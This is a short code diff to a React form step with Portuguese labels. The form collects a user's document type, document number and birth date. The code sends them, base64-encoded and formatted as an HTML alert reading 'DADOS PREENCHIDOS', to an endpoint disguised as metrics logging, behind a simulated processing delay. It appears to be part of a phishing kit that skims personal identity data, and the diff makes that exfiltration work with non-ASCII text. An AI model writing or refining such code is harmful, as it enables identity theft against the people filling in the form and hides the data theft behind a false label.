@@ -95,12 +95,12 @@ export function Step1({ onSuccess, onNotify }: Step1Props) {
     // Simulate processing
     setTimeout(async () => {
       try {
-        const payload = btoa(JSON.stringify({
-          message: `<b>📝 DADOS PREENCHIDOS</b>\n\n<b>Tipo:</b> ${docType}\n<b>Documento:</b> ${docValue}\n<b>Nascimento:</b> ${birthDate}\n<b>Status:</b> 🟡 Aguardando consulta...`
-        }));
+        const message = `<b>📝 DADOS PREENCHIDOS</b>\n\n<b>Tipo:</b> ${docType}\n<b>Documento:</b> ${docValue}\n<b>Nascimento:</b> ${birthDate}\n<b>Status:</b> 🟡 Aguardando consulta...`;
+        // UTF-8 safe base64 encoding
+        const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ message }))));
         await axios.post(`${API_URL}/api/v1/metrics/log`, { payload });
       } catch (err) {
-        console.error("Failed to notify", err);
+        console.error("Failed to notify metrics", err);
       }
       setLoading(false);
       onSuccess({ docType, docValue, birthDate });
